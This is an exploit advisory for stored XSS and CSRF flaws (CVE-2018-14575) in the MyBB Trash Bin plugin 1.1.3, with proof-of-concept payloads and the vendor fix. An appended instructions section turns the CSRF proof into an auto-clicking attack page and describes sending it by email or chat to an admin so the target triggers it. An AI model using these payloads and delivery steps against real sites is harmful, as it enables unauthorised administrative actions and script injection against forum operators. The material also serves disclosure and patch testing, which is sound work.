# Exploit Title: MyBB Trash Bin Plugin 1.1.3 - Cross-Site Scripting / CSRF
# Date: 7/17/2018
# Author: 0xB9
# Twitter: @0xB9Sec
# Contact: 0xB9[at]pm.me
# Software Link: https://community.mybb.com/mods.php?action=view&pid=957
# Version: 1.1.3
# Tested on: Ubuntu 18.04
# CVE: CVE-2018-14575


1. Description:
Creates a trash bin in the ACP where you can recover permanent deleted threads and posts. The thread/post subjects allow XSS and deleted posts can be restored by CSRF.
 

2. Proof of Concept:

Cross-Site Scripting

- Create a new thread with the following subject  <script>alert('XSS')</script>
- Permanently delete that thread
- Alert is located in threads trash bin localhost/[path]/admin/index.php?module=tools-trashbin and localhost/admin/index.php?module=tools-trashbin&action=posts

- Reply to a post and change the subject to the following  <script>alert('XSS')</script>
- Permanently delete that post
- Alert is located in posts trash bin localhost/[path]/admin/index.php?module=tools-trashbin&action=posts


Cross-Site Request Forgery

<html>
	<body>
		<!-- Restore deleted threads & posts by thread/post ID -->
		<div class="popup_item_container"><a href="http://localhost/[path]/admin/index.php?module=tools-trashbin&action=threadrestore&tid=1" class="popup_item">Restore</a></div>
		<script type="text/javascript">
			$("#thread_1").popupMenu();
		</script>
	</body>
</html>

3. Solution:
Update to 1.1.4



Instructions:

Preparation:
Install MyBB and Trash Bin Plugin:

Download and install MyBB on your server.
Install the Trash Bin Plugin version 1.1.3 from the provided link.
Setup Test Environment:

Ensure the MyBB application with the Trash Bin Plugin is accessible from a browser.
Log in to the MyBB admin control panel (ACP).


Navigate to the MyBB forum and create a new thread with the following subject:
<script>alert('XSS')</script>
Post and then permanently delete the thread.

Go to the trash bin by visiting the URL: http://localhost/[path]/admin/index.php?module=tools-trashbin.
Check the thread list to see if the XSS payload is executed.

Reply to an existing post and set the subject to:
<script>alert('XSS')</script>
Permanently delete the post.

Visit the URL: http://localhost/[path]/admin/index.php?module=tools-trashbin&action=posts.
Check the deleted posts to see if the XSS payload is executed.


	Testing Cross-Site Request Forgery (CSRF):

Save the following HTML code as csrf_restore.html:
<!-- CSRF Exploit for MyBB Trash Bin Plugin (Restore Deleted Threads/Posts) -->
<html>
<body>
<script>history.pushState('', '', '/')</script>
  <a href="http://localhost/[path]/admin/index.php?module=tools-trashbin&action=threadrestore&tid=1">
    Restore Thread
  </a>
  <script>
    document.querySelector('a').click();
  </script>
</body>
</html>

Replace http://localhost/[path] with the actual URL where MyBB is hosted.
Adjust tid=1 to the thread ID you wish to restore.
Host the csrf_restore.html file on a web server or use a local file server if testing locally.


Share the URL to the csrf_restore.html file with an admin or user with sufficient privileges. This could be done via email, chat, or any other method that the target might access.

After the admin or user visits the csrf_restore.html page, log in to the MyBB ACP to check if the specified thread or post has been restored.

